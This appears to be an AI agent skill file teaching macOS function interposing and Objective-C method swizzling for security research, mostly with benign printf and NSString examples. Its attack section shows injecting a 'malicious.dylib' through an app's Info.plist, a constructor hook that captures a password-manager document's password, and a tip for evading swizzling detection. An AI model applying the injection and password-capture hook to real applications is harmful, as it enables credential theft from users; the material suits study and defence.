---
name: macos-function-hooking
description: macOS function hooking and method swizzling for security research. Use this skill whenever you need to intercept function calls, hook Objective-C methods, analyze binary behavior, or understand macOS runtime manipulation. Trigger this for any task involving dylib injection, function interposing, method swizzling, or runtime code interception on macOS.
---

# macOS Function Hooking

A skill for understanding and implementing function hooking techniques on macOS for security research and binary analysis.

## When to Use This Skill

Use this skill when you need to:
- Intercept and modify function calls in macOS applications
- Hook Objective-C methods for runtime analysis
- Create dylibs for function interposing
- Understand macOS dynamic linking and runtime behavior
- Perform security research on macOS applications
- Analyze how applications handle sensitive data at runtime

## Function Interposing

Function interposing allows you to replace one function with another at the dynamic linker level using the `__interpose` section.

### Basic Interpose Setup

1. **Create a dylib with interpose section**
2. **Define replacement and original function pointers**
3. **Inject using `DYLD_INSERT_LIBRARIES`**

### Interpose Example

Create `interpose.c`:

```c
// Compile: gcc -dynamiclib interpose.c -o interpose.dylib
#include <stdio.h>
#include <stdarg.h>

int my_printf(const char *format, ...) {
    int ret = printf("Hello from interpose\n");
    return ret;
}

__attribute__((used)) static struct { 
    const void *replacement; 
    const void *replacee; 
} _interpose_printf
__attribute__ ((section ("__DATA,__interpose"))) = { 
    (const void *)(unsigned long)&my_printf, 
    (const void *)(unsigned long)&printf 
};
```

Create a test program `hello.c`:

```c
// Compile: gcc hello.c -o hello
#include <stdio.h>

int main() {
    printf("Hello World!\n");
    return 0;
}
```

Run with injection:

```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./hello
# Output: Hello from interpose
```

### Alternative Interpose Macro

Use this cleaner macro approach:

```c
#define DYLD_INTERPOSE(_replacement, _replacee) \
    __attribute__((used)) static struct { \
        const void* replacement; \
        const void* replacee; \
    } _interpose_##_replacee __attribute__ ((section("__DATA,__interpose"))) = { \
        (const void*) (unsigned long) &_replacement, \
        (const void*) (unsigned long) &_replacee \
    };

int my_printf(const char *format, ...) {
    int ret = printf("Hello from interpose\n");
    return ret;
}

DYLD_INTERPOSE(my_printf, printf);
```

### Debug Interposing

Use `DYLD_PRINT_INTERPOSING` to debug:

```bash
DYLD_PRINT_INTERPOSING=1 DYLD_INSERT_LIBRARIES=./interpose.dylib ./hello
```

### Dynamic Interposing

For runtime interposing (after process starts):

```c
struct dyld_interpose_tuple {
    const void* replacement;
    const void* replacee;
};

extern void dyld_dynamic_interpose(const struct mach_header* mh,
        const struct dyld_interpose_tuple array[], size_t count);
```

## Method Swizzling

Method swizzling modifies Objective-C method implementations at runtime using the Objective-C runtime API.

### Understanding Objective-C Messages

Objective-C method calls use `objc_msgSend`:

```objectivec
// Method call: [myClassInstance nameOfTheMethodFirstParam:param1 secondParam:param2]
// Becomes:
int i = ((int (*)(id, SEL, NSString *, NSString *))objc_msgSend)(
    someObject, 
    @selector(method1p1:p2:), 
    value1, 
    value2
);
```

### Accessing Method Information

```objectivec
// Compile: gcc -framework Foundation test.m -o test
#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <objc/message.h>

int main() {
    NSString* str = @"This is an example";
    Class strClass = [str class];
    
    // Get class name
    NSLog(@"Class name: %s", class_getName(strClass));
    
    // Get method information
    SEL sel = @selector(length);
    Method m = class_getInstanceMethod(strClass, sel);
    NSLog(@"Number of arguments: %d", method_getNumberOfArguments(m));
    NSLog(@"Implementation address: 0x%lx", (unsigned long)method_getImplementation(m));
    
    return 0;
}
```

### Swizzling with method_exchangeImplementations

This swaps two method implementations:

```objectivec
// Compile: gcc -framework Foundation swizzle.m -o swizzle
#import <Foundation/Foundation.h>
#import <objc/runtime.h>

@interface NSString (SwizzleString)
- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from;
@end

@implementation NSString (SwizzleString)
- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from {
    NSLog(@"Custom implementation called");
    // Call original (now swapped)
    return [self swizzledSubstringFromIndex:from];
}
@end

int main(int argc, const char * argv[]) {
    @autoreleasepool {
        Method originalMethod = class_getInstanceMethod([NSString class], @selector(substringFromIndex:));
        Method swizzledMethod = class_getInstanceMethod([NSString class], @selector(swizzledSubstringFromIndex:));
        method_exchangeImplementations(originalMethod, swizzledMethod);
        
        NSString *myString = @"Hello, World!";
        NSString *subString = [myString substringFromIndex:7];
        NSLog(@"Substring: %@", subString);
    }
    return 0;
}
```

### Swizzling with method_setImplementation

This replaces one method's implementation directly:

```objectivec
#import <Foundation/Foundation.h>
#import <objc/runtime.h>

static IMP original_substringFromIndex = NULL;

@interface NSString (SwizzleString)
- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from;
@end

@implementation NSString (SwizzleString)
- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from {
    NSLog(@"Custom implementation called");
    // Call original using stored IMP
    return ((NSString *(*)(id, SEL, NSUInteger))original_substringFromIndex)(self, _cmd, from);
}
@end

int main(int argc, const char * argv[]) {
    @autoreleasepool {
        Class stringClass = [NSString class];
        Method originalMethod = class_getInstanceMethod(stringClass, @selector(substringFromIndex:));
        IMP swizzledIMP = method_getImplementation(
            class_getInstanceMethod(stringClass, @selector(swizzledSubstringFromIndex:))
        );
        
        // Store original and set new implementation
        original_substringFromIndex = method_setImplementation(originalMethod, swizzledIMP);
        
        NSString *myString = @"Hello, World!";
        NSString *subString = [myString substringFromIndex:7];
        NSLog(@"Substring: %@", subString);
        
        // Restore original
        method_setImplementation(originalMethod, original_substringFromIndex);
    }
    return 0;
}
```

## Hooking Attack Methodology

### Injection Vectors

1. **DYLD_INSERT_LIBRARIES environment variable**
2. **Info.plist modification** (for signed apps)
3. **Dylib process injection via task port**

### Modifying App Info.plist

```xml
<key>LSEnvironment</key>
<dict>
    <key>DYLD_INSERT_LIBRARIES</key>
    <string>/path/to/malicious.dylib</string>
</dict>
```

Then re-register:

```bash
/System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Support/lsregister -f /Applications/Application.app
```

### Library Constructor Hooking

```objectivec
// Compile: gcc -dynamiclib -framework Foundation hook.m -o hook.dylib
#include <Foundation/Foundation.h>
#import <objc/runtime.h>

static IMP real_setPassword = NULL;

static BOOL custom_setPassword(id self, SEL _cmd, NSString* password, NSURL* keyFileURL) {
    NSLog(@"[+] Password captured: %@", password);
    // Call original
    return ((BOOL (*)(id,SEL,NSString*, NSURL*))real_setPassword)(self, _cmd, password, keyFileURL);
}

__attribute__((constructor))
static void customConstructor(int argc, const char **argv) {
    Class classMPDocument = NSClassFromString(@"MPDocument");
    Method real_Method = class_getInstanceMethod(classMPDocument, @selector(setPassword:keyFileURL:));
    
    IMP fake_IMP = (IMP)custom_setPassword;
    real_setPassword = method_setImplementation(real_Method, fake_IMP);
}
```

## Important Considerations

### Limitations

- **DYLD_INSERT_LIBRARIES** only works on unprotected binaries
- System Integrity Protection (SIP) blocks injection on protected processes
- Stripping app signatures may prevent execution on newer macOS versions
- Interposing doesn't work with shared library cache

### Detection Risks

- Method name verification can detect swizzling
- Some apps check for hooking indicators
- Use `method_setImplementation` over `method_exchangeImplementations` to avoid detection

### Best Practices

1. Always store original IMP before overwriting
2. Call original implementation to maintain functionality
3. Use library constructors for automatic initialization
4. Test on unprotected binaries first
5. Document all modifications for reproducibility

## References

- [nshipster.com/method-swizzling](https://nshipster.com/method-swizzling/)
- macOS Runtime Programming Guide
- dyld documentation

## Tools

Use these scripts for common tasks:
- `compile_interpose.sh` - Compile interpose dylibs
- `compile_swizzle.sh` - Compile swizzle code
- `test_hook.sh` - Test hook injection
